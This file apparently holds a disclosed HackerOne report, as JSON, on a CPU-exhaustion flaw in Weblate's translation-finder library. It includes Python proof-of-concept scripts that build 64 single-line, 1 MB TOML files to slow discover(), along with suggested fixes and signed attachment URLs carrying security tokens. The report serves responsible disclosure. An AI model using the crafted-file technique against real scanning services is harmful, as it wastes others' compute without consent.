@@ -1,0 +1,171 @@
+{
+  "id": 4105212,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTA1MjEy",
+  "url": "https://hackerone.com/reports/4105212",
+  "title": "CPU Exhaustion via Crafted TOML Files in translation-finder",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-10-11T15:30:56.614Z",
+  "submitted_at": "2026-10-11T15:30:56.970Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "visionx7",
+    "url": "/visionx7",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/oql9vcdkyu4cz3iagrcw812qx1dp/f4770e29726b679d8210b3bcebb50139392345e8ead50e7d67de79a93076e327"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19468,
+    "url": "https://hackerone.com/weblate",
+    "handle": "weblate",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/468/71eb3827ae9f2a388f27bd4b7eefd20bc3ac813c_original.png/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/468/71eb3827ae9f2a388f27bd4b7eefd20bc3ac813c_original.png/2a499a0b732abf809ef45635d9ad400431480fafd17452e700cbdba6fd64fe85"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Weblate",
+      "twitter_handle": "WeblateOrg",
+      "website": "https://weblate.org/",
+      "about": "Weblate is a libre software web-based continuous localization system"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-11-17T20:17:15.329Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-10-18T20:17:06.165Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The `translation-finder` library has a function that checks TOML files to see if they are go-i18n format files. This function reads the file one character at a time in a loop. If a TOML file has one very long line (around 1 MB), this check takes about 0.1 to 0.15 seconds to run.\n \nAn attacker can create a repository with about 64 files like this. When a tool like Weblate scans this repository using `discover()`, it takes about 7 seconds to finish, instead of a few milliseconds. The built in budget system limits the damage to around 7 to 8 seconds per scan, but this cost is easy to trigger and repeat.\n \n**Affected project:** WeblateOrg/translation-finder\n**Affected version:** 3.7.1\n**Affected commit:** `aa9017b412c521ca794564bf3e1bfa4e2b3c280b`\n**Affected file:** `translation_finder/discovery/files.py`\n**Affected functions:** `_toml_line_code()` and `_is_go_i18n_toml()`\n \n## Steps to Reproduce\n \n**Environment used:** Python 3 (fish shell), local clone of the repository, installed with `pip install -e .`\n \n### Step 1: Clone the repository and confirm the commit\n \n```bash\ngit clone https://github.com/WeblateOrg/translation-finder.git\ncd translation-finder\ngit log -1\npip install -e . --break-system-packages\n```\n \n### Step 2: Run a baseline test with a normal, small repository\n \n```fish\nset -x PYTHONPATH .\n \ntime python3 -c \"\nimport tempfile, time\nfrom pathlib import Path\nfrom translation_finder.api import discover\n \nwith tempfile.TemporaryDirectory() as tmpdir:\n    root = Path(tmpdir)\n    for i in range(5):\n        d = root / f'proj{i}'\n        d.mkdir()\n        (d / 'en.po').write_text('msgid \\\"a\\\"\\nmsgstr \\\"b\\\"\\n')\n    t0 = time.time()\n    results = discover(str(root))\n    print(f'BASELINE elapsed: {time.time()-t0:.4f}s, results: {len(results)}')\n\"\n```\n \nThis finishes in a few milliseconds. This is the normal, expected speed.\n \n### Step 3: Run the crafted repository test\n \nCreate 64 folders. Each folder has one TOML file with a single line about 1 MB long.\n \n```fish\nset -x PYTHONPATH .\n \ntime python3 -c \"\nimport tempfile, time\nfrom pathlib import Path\nfrom translation_finder.api import discover\n \nwith tempfile.TemporaryDirectory() as tmpdir:\n    root = Path(tmpdir)\n    big_toml = '\\\"' + 'x' * (1024 * 1024 - 10) + '\\\"'\n    for i in range(64):\n        d = root / f'proj{i}'\n        d.mkdir()\n        (d / 'en.toml').write_text(big_toml)\n        (d / 'fr.toml').write_text('\\\"hello\\\"')\n    t0 = time.time()\n    results = discover(str(root))\n    elapsed = time.time() - t0\n    print(f'MALICIOUS REPO elapsed: {elapsed:.2f}s, results: {len(results)}')\n\"\n```\n \n**Result:** elapsed time of about 7.16 seconds, instead of a few milliseconds. The `usr time` is almost equal to `real time`, which shows the CPU is busy the whole time, not waiting on disk or network.\n \n### Step 4: Confirm the delay does not grow with a bigger repository\n \nRepeat Step 3 but use 200 folders instead of 64.\n \n**Result:** elapsed time of about 7.20 seconds, almost the same as Step 3 with only 64 folders. This shows the delay is capped by the tool's own internal budget, not by how big the malicious repository is. This means an attacker does not need a large repository. A small one with about 64 crafted files is enough to cause the full delay.\n \n### Step 5: Confirm the exact function causing the delay\n \n```fish\nset -x PYTHONPATH .\n \npython3 -c \"\nimport time\nfrom translation_finder.discovery.files import _is_go_i18n_toml\n \nbig_toml = '\\\"' + 'x' * (1024 * 1024 - 10) + '\\\"'\nt0 = time.time()\nresult = _is_go_i18n_toml(big_toml)\nelapsed = time.time() - t0\nprint(f'_is_go_i18n_toml() time: {elapsed:.3f}s, result={result}')\n\"\n```\n \n**Result:** about 0.119 seconds for one file. Multiplied by 64 files, this is close to the total delay seen in Step 3 and Step 4. This confirms the delay comes from this one function.\n \n## POC Evidence (Screenshots)\n \n| File | What it shows |\n|---|---|\n| `01-setup-commit-and-install.png` | Repository cloned, exact commit confirmed, install successful |\n| `02-baseline-legit-repo.png` | Normal repository scan finishes in milliseconds |\n| `03-crafted-toml-runtime.png` | Crafted repository (64 files) takes about 7.16 seconds, CPU bound |\n| `04-amplification-200-dirs.png` | Crafted repository with 200 files still takes about 7.20 seconds, confirms budget cap |\n| `05-isolated-root-cause.png` | Single function call takes 0.119s, confirms the exact root cause |\n\n## Impact\n\n- A repository with about 64 crafted TOML files causes the `discover()` function to take about 7 to 8 seconds, instead of milliseconds.\n- `discover()` is meant to be used by tools like Weblate to scan repositories automatically, for example when a new repository or component is added, or when a repository is scanned again after a push.\n- An attacker only needs to add a small number of large, single line TOML files to a repository. They do not need write access to the server, only the ability to get their repository content scanned (for example, by submitting it as a project, or contributing to a repository that gets rescanned).\n- If this scan runs often, for example on every push or every scheduled scan, this becomes a repeatable way to waste CPU time on the server doing the scanning.\n- This is a CPU exhaustion issue. It does not read files outside the repository, does not leak data, and does not allow code execution. The damage is limited by the tool's own budget system to around 7 to 8 seconds per scan.\n## Remediation\n \nThe root cause is in `_toml_line_code()`. This function reads a line of text one character at a time in a Python loop. For very long lines, this becomes slow because there is no limit on how long a single line can be before the function starts working on it.\n \n**Suggested fix 1:** Add a maximum line length check before running the character by character scan. If any line in the file is longer than a reasonable limit (for example, 4096 characters), skip the TOML check for that file. Normal go-i18n TOML files do not have single lines that are 1 MB long.\n \n**Suggested fix 2:** Replace the manual character by character loop with a faster method, such as using regular expressions or built in string search functions, so that scanning long lines does not cost as much CPU time.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 6962848,
+      "file_name": "01-setup-commit-and-install.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qr0x6vvrlsgutafsy33hvgdcmg3i?response-content-disposition=attachment%3B%20filename%3D%2201-setup-commit-and-install.png%22%3B%20filename%2A%3DUTF-8%27%2701-setup-commit-and-install.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTR63IZBN%2F20261118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261118T015923Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQCbK6kvwO%2FFoRQum%2FLZOT37XdQXIZ6%2BrvEBGMB%2FO%2FyFrQIhALKpK39xlzsMXXUGl9IJ7OMXzlmudC8e1oOKONe13raVKrsFCPL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxWeFDXeZWqed19vZYqjwWz5xttAM8HW%2F2kjxAFIABjvCbLgs1d%2FKvOgfOJB19S%2Bw1GRB99HsojQaVPGUoKmS65dtlF1iO%2FUulkHl8pHIZ%2FWAzQE67pIFGRYv5NX9wBeRHPz4GfcXmS0ewUQhDW5OvEENxodYLcyVGcOwdXa%2F2G4XPVBiADREF7Rv0LSFP%2Bam%2BJWbtZQ%2Fhx3Y7dcU506YtC3dQiLAwiIhsCxqO7yotmmmz7luJ87LKFl%2BzisUBvjJXcwtQGT8mVjuf4cLlDvvShlW1Fe8L%2FDKJt8OwSjS8XgHNXAD8ynvM8hNsfoKz%2BSL%2BA1v%2FZ6GxYrwZrB%2BbxfapTgQj8uUSK04JEJnOq5LcEU%2FzFNsB8JDlCqHNSFUTQzsm2p71Jc%2FM%2FKAWM%2BkvbXf3r8FiE%2BBIgaJs2ni86waE%2Bf4%2BVzOObSpGPUhhKR4Q8zqkknL8seW%2F0d0cJlqNNJ%2FZtx4bUKbzQAXRlFEaxIUi1izA8XuK0qE7WoarzuHoNXVWYqgkvrK6UiqDMC59ZOc83z0NhxfKa23Wac8fcP2o%2B0TL1ebU9HtJ2N1FEvHp6Ao6tbC2PgUjlK2eGW756%2BeqkmAJlw6vO%2BJqqscLz95VOUtxrkAVu0kf6fXqrE1rmbS1sgjIXSu%2ByGW6FV3T9378xHOr6N7%2FdWYvtflrqgNIjJl2RKp8SsfF9pvN4T%2FoBN94KievLvJuYaljGc11HmIRsAYWF2u9h1Yk5bdslUalojf6KAK6xrn1cLNhLiyDu3bUrBbuKEL7CGAHw9Tzym1cgh%2F9qtE5qMNxFT31uUGL97Rp87OcZ6rX7VFpJxWLYKAv%2B7KsOe568xHspvXS5T25o66ZDWZEDqzLwOaxOO17oprQ4FSxrmTYAkuLadz1yMJPg89cGOrABMzkA1owwavLXRGU2ZE%2BKo8j3bfjo%2FYhLwUqiFV9%2BmGVaVVxd8%2F6KIi6KsW1cHFfqy7kEBGGqiprA98mC6iIoPGQupAf%2FzKga0Go0Q1ydp0Edy9QCeg%2F0cfrI7j5meRmt31LVkUIudLsp2iB4w5PuGvvOvrApNVj%2Ft8uHV9gVJ3CaBusrZ4yw7fHSSL4cMDp%2FoZal3LHqS4q%2BepxOKFjBS7cdbvfIxlCcVqb64SUFk%2FU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fa15f1b6a8773a0365fa7fd652ff6fec2d7deb6bc2ced7e196077e69fe3dbd30",
+      "file_size": 28881,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 6962849,
+      "file_name": "02-baseline-legit-repo.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ibs3i0544fk4s9a0lrzmlkdhwoyx?response-content-disposition=attachment%3B%20filename%3D%2202-baseline-legit-repo.png%22%3B%20filename%2A%3DUTF-8%27%2702-baseline-legit-repo.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTR63IZBN%2F20261118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261118T015923Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQCbK6kvwO%2FFoRQum%2FLZOT37XdQXIZ6%2BrvEBGMB%2FO%2FyFrQIhALKpK39xlzsMXXUGl9IJ7OMXzlmudC8e1oOKONe13raVKrsFCPL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxWeFDXeZWqed19vZYqjwWz5xttAM8HW%2F2kjxAFIABjvCbLgs1d%2FKvOgfOJB19S%2Bw1GRB99HsojQaVPGUoKmS65dtlF1iO%2FUulkHl8pHIZ%2FWAzQE67pIFGRYv5NX9wBeRHPz4GfcXmS0ewUQhDW5OvEENxodYLcyVGcOwdXa%2F2G4XPVBiADREF7Rv0LSFP%2Bam%2BJWbtZQ%2Fhx3Y7dcU506YtC3dQiLAwiIhsCxqO7yotmmmz7luJ87LKFl%2BzisUBvjJXcwtQGT8mVjuf4cLlDvvShlW1Fe8L%2FDKJt8OwSjS8XgHNXAD8ynvM8hNsfoKz%2BSL%2BA1v%2FZ6GxYrwZrB%2BbxfapTgQj8uUSK04JEJnOq5LcEU%2FzFNsB8JDlCqHNSFUTQzsm2p71Jc%2FM%2FKAWM%2BkvbXf3r8FiE%2BBIgaJs2ni86waE%2Bf4%2BVzOObSpGPUhhKR4Q8zqkknL8seW%2F0d0cJlqNNJ%2FZtx4bUKbzQAXRlFEaxIUi1izA8XuK0qE7WoarzuHoNXVWYqgkvrK6UiqDMC59ZOc83z0NhxfKa23Wac8fcP2o%2B0TL1ebU9HtJ2N1FEvHp6Ao6tbC2PgUjlK2eGW756%2BeqkmAJlw6vO%2BJqqscLz95VOUtxrkAVu0kf6fXqrE1rmbS1sgjIXSu%2ByGW6FV3T9378xHOr6N7%2FdWYvtflrqgNIjJl2RKp8SsfF9pvN4T%2FoBN94KievLvJuYaljGc11HmIRsAYWF2u9h1Yk5bdslUalojf6KAK6xrn1cLNhLiyDu3bUrBbuKEL7CGAHw9Tzym1cgh%2F9qtE5qMNxFT31uUGL97Rp87OcZ6rX7VFpJxWLYKAv%2B7KsOe568xHspvXS5T25o66ZDWZEDqzLwOaxOO17oprQ4FSxrmTYAkuLadz1yMJPg89cGOrABMzkA1owwavLXRGU2ZE%2BKo8j3bfjo%2FYhLwUqiFV9%2BmGVaVVxd8%2F6KIi6KsW1cHFfqy7kEBGGqiprA98mC6iIoPGQupAf%2FzKga0Go0Q1ydp0Edy9QCeg%2F0cfrI7j5meRmt31LVkUIudLsp2iB4w5PuGvvOvrApNVj%2Ft8uHV9gVJ3CaBusrZ4yw7fHSSL4cMDp%2FoZal3LHqS4q%2BepxOKFjBS7cdbvfIxlCcVqb64SUFk%2FU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=69f07088e562bd989c244a122829ffef7b240a6597cd3ff0ec110e8aaa9281e3",
+      "file_size": 53765,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 6962850,
+      "file_name": "03-crafted-toml-runtime.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2qmmw29ov2yzdrcx9rz69akxpjzf?response-content-disposition=attachment%3B%20filename%3D%2203-crafted-toml-runtime.png%22%3B%20filename%2A%3DUTF-8%27%2703-crafted-toml-runtime.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTR63IZBN%2F20261118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261118T015923Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQCbK6kvwO%2FFoRQum%2FLZOT37XdQXIZ6%2BrvEBGMB%2FO%2FyFrQIhALKpK39xlzsMXXUGl9IJ7OMXzlmudC8e1oOKONe13raVKrsFCPL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxWeFDXeZWqed19vZYqjwWz5xttAM8HW%2F2kjxAFIABjvCbLgs1d%2FKvOgfOJB19S%2Bw1GRB99HsojQaVPGUoKmS65dtlF1iO%2FUulkHl8pHIZ%2FWAzQE67pIFGRYv5NX9wBeRHPz4GfcXmS0ewUQhDW5OvEENxodYLcyVGcOwdXa%2F2G4XPVBiADREF7Rv0LSFP%2Bam%2BJWbtZQ%2Fhx3Y7dcU506YtC3dQiLAwiIhsCxqO7yotmmmz7luJ87LKFl%2BzisUBvjJXcwtQGT8mVjuf4cLlDvvShlW1Fe8L%2FDKJt8OwSjS8XgHNXAD8ynvM8hNsfoKz%2BSL%2BA1v%2FZ6GxYrwZrB%2BbxfapTgQj8uUSK04JEJnOq5LcEU%2FzFNsB8JDlCqHNSFUTQzsm2p71Jc%2FM%2FKAWM%2BkvbXf3r8FiE%2BBIgaJs2ni86waE%2Bf4%2BVzOObSpGPUhhKR4Q8zqkknL8seW%2F0d0cJlqNNJ%2FZtx4bUKbzQAXRlFEaxIUi1izA8XuK0qE7WoarzuHoNXVWYqgkvrK6UiqDMC59ZOc83z0NhxfKa23Wac8fcP2o%2B0TL1ebU9HtJ2N1FEvHp6Ao6tbC2PgUjlK2eGW756%2BeqkmAJlw6vO%2BJqqscLz95VOUtxrkAVu0kf6fXqrE1rmbS1sgjIXSu%2ByGW6FV3T9378xHOr6N7%2FdWYvtflrqgNIjJl2RKp8SsfF9pvN4T%2FoBN94KievLvJuYaljGc11HmIRsAYWF2u9h1Yk5bdslUalojf6KAK6xrn1cLNhLiyDu3bUrBbuKEL7CGAHw9Tzym1cgh%2F9qtE5qMNxFT31uUGL97Rp87OcZ6rX7VFpJxWLYKAv%2B7KsOe568xHspvXS5T25o66ZDWZEDqzLwOaxOO17oprQ4FSxrmTYAkuLadz1yMJPg89cGOrABMzkA1owwavLXRGU2ZE%2BKo8j3bfjo%2FYhLwUqiFV9%2BmGVaVVxd8%2F6KIi6KsW1cHFfqy7kEBGGqiprA98mC6iIoPGQupAf%2FzKga0Go0Q1ydp0Edy9QCeg%2F0cfrI7j5meRmt31LVkUIudLsp2iB4w5PuGvvOvrApNVj%2Ft8uHV9gVJ3CaBusrZ4yw7fHSSL4cMDp%2FoZal3LHqS4q%2BepxOKFjBS7cdbvfIxlCcVqb64SUFk%2FU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=508b7c488adb2397db031ac7b8589dfb46fc0a52f0a9eef51a1f5dca337b09a7",
+      "file_size": 60277,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 6962851,
+      "file_name": "04-amplification-200-dirs.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9913avuqcujukr488hspr2xlah3b?response-content-disposition=attachment%3B%20filename%3D%2204-amplification-200-dirs.png%22%3B%20filename%2A%3DUTF-8%27%2704-amplification-200-dirs.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTR63IZBN%2F20261118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261118T015923Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQCbK6kvwO%2FFoRQum%2FLZOT37XdQXIZ6%2BrvEBGMB%2FO%2FyFrQIhALKpK39xlzsMXXUGl9IJ7OMXzlmudC8e1oOKONe13raVKrsFCPL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxWeFDXeZWqed19vZYqjwWz5xttAM8HW%2F2kjxAFIABjvCbLgs1d%2FKvOgfOJB19S%2Bw1GRB99HsojQaVPGUoKmS65dtlF1iO%2FUulkHl8pHIZ%2FWAzQE67pIFGRYv5NX9wBeRHPz4GfcXmS0ewUQhDW5OvEENxodYLcyVGcOwdXa%2F2G4XPVBiADREF7Rv0LSFP%2Bam%2BJWbtZQ%2Fhx3Y7dcU506YtC3dQiLAwiIhsCxqO7yotmmmz7luJ87LKFl%2BzisUBvjJXcwtQGT8mVjuf4cLlDvvShlW1Fe8L%2FDKJt8OwSjS8XgHNXAD8ynvM8hNsfoKz%2BSL%2BA1v%2FZ6GxYrwZrB%2BbxfapTgQj8uUSK04JEJnOq5LcEU%2FzFNsB8JDlCqHNSFUTQzsm2p71Jc%2FM%2FKAWM%2BkvbXf3r8FiE%2BBIgaJs2ni86waE%2Bf4%2BVzOObSpGPUhhKR4Q8zqkknL8seW%2F0d0cJlqNNJ%2FZtx4bUKbzQAXRlFEaxIUi1izA8XuK0qE7WoarzuHoNXVWYqgkvrK6UiqDMC59ZOc83z0NhxfKa23Wac8fcP2o%2B0TL1ebU9HtJ2N1FEvHp6Ao6tbC2PgUjlK2eGW756%2BeqkmAJlw6vO%2BJqqscLz95VOUtxrkAVu0kf6fXqrE1rmbS1sgjIXSu%2ByGW6FV3T9378xHOr6N7%2FdWYvtflrqgNIjJl2RKp8SsfF9pvN4T%2FoBN94KievLvJuYaljGc11HmIRsAYWF2u9h1Yk5bdslUalojf6KAK6xrn1cLNhLiyDu3bUrBbuKEL7CGAHw9Tzym1cgh%2F9qtE5qMNxFT31uUGL97Rp87OcZ6rX7VFpJxWLYKAv%2B7KsOe568xHspvXS5T25o66ZDWZEDqzLwOaxOO17oprQ4FSxrmTYAkuLadz1yMJPg89cGOrABMzkA1owwavLXRGU2ZE%2BKo8j3bfjo%2FYhLwUqiFV9%2BmGVaVVxd8%2F6KIi6KsW1cHFfqy7kEBGGqiprA98mC6iIoPGQupAf%2FzKga0Go0Q1ydp0Edy9QCeg%2F0cfrI7j5meRmt31LVkUIudLsp2iB4w5PuGvvOvrApNVj%2Ft8uHV9gVJ3CaBusrZ4yw7fHSSL4cMDp%2FoZal3LHqS4q%2BepxOKFjBS7cdbvfIxlCcVqb64SUFk%2FU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c1d96ad6fca2d52c2703a5be948bd7817ad64823c1ef5203ebe738a90c12dd59",
+      "file_size": 61504,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 6962852,
+      "file_name": "05-isolated-root-cause.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ltj7pb4mzz6bguxj1iftoyuy6cns?response-content-disposition=attachment%3B%20filename%3D%2205-isolated-root-cause.png%22%3B%20filename%2A%3DUTF-8%27%2705-isolated-root-cause.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTR63IZBN%2F20261118%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261118T015923Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQCbK6kvwO%2FFoRQum%2FLZOT37XdQXIZ6%2BrvEBGMB%2FO%2FyFrQIhALKpK39xlzsMXXUGl9IJ7OMXzlmudC8e1oOKONe13raVKrsFCPL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxWeFDXeZWqed19vZYqjwWz5xttAM8HW%2F2kjxAFIABjvCbLgs1d%2FKvOgfOJB19S%2Bw1GRB99HsojQaVPGUoKmS65dtlF1iO%2FUulkHl8pHIZ%2FWAzQE67pIFGRYv5NX9wBeRHPz4GfcXmS0ewUQhDW5OvEENxodYLcyVGcOwdXa%2F2G4XPVBiADREF7Rv0LSFP%2Bam%2BJWbtZQ%2Fhx3Y7dcU506YtC3dQiLAwiIhsCxqO7yotmmmz7luJ87LKFl%2BzisUBvjJXcwtQGT8mVjuf4cLlDvvShlW1Fe8L%2FDKJt8OwSjS8XgHNXAD8ynvM8hNsfoKz%2BSL%2BA1v%2FZ6GxYrwZrB%2BbxfapTgQj8uUSK04JEJnOq5LcEU%2FzFNsB8JDlCqHNSFUTQzsm2p71Jc%2FM%2FKAWM%2BkvbXf3r8FiE%2BBIgaJs2ni86waE%2Bf4%2BVzOObSpGPUhhKR4Q8zqkknL8seW%2F0d0cJlqNNJ%2FZtx4bUKbzQAXRlFEaxIUi1izA8XuK0qE7WoarzuHoNXVWYqgkvrK6UiqDMC59ZOc83z0NhxfKa23Wac8fcP2o%2B0TL1ebU9HtJ2N1FEvHp6Ao6tbC2PgUjlK2eGW756%2BeqkmAJlw6vO%2BJqqscLz95VOUtxrkAVu0kf6fXqrE1rmbS1sgjIXSu%2ByGW6FV3T9378xHOr6N7%2FdWYvtflrqgNIjJl2RKp8SsfF9pvN4T%2FoBN94KievLvJuYaljGc11HmIRsAYWF2u9h1Yk5bdslUalojf6KAK6xrn1cLNhLiyDu3bUrBbuKEL7CGAHw9Tzym1cgh%2F9qtE5qMNxFT31uUGL97Rp87OcZ6rX7VFpJxWLYKAv%2B7KsOe568xHspvXS5T25o66ZDWZEDqzLwOaxOO17oprQ4FSxrmTYAkuLadz1yMJPg89cGOrABMzkA1owwavLXRGU2ZE%2BKo8j3bfjo%2FYhLwUqiFV9%2BmGVaVVxd8%2F6KIi6KsW1cHFfqy7kEBGGqiprA98mC6iIoPGQupAf%2FzKga0Go0Q1ydp0Edy9QCeg%2F0cfrI7j5meRmt31LVkUIudLsp2iB4w5PuGvvOvrApNVj%2Ft8uHV9gVJ3CaBusrZ4yw7fHSSL4cMDp%2FoZal3LHqS4q%2BepxOKFjBS7cdbvfIxlCcVqb64SUFk%2FU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c09bb8646a9d10b15abcd3e106f43f8f1079c58e1d2332164e332c42ec78fa50",
+      "file_size": 39296,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-11-17T20:17:06.370Z",
+  "allow_singular_disclosure_after": -20537.469194667,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "2026",
+    "visionx7",
+    "0ngol",
+    "ishaqkhan56"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 5.3,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 31977,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/WeblateOrg/translation-finder",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": [],
+    "can_view_ave_report?": false
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
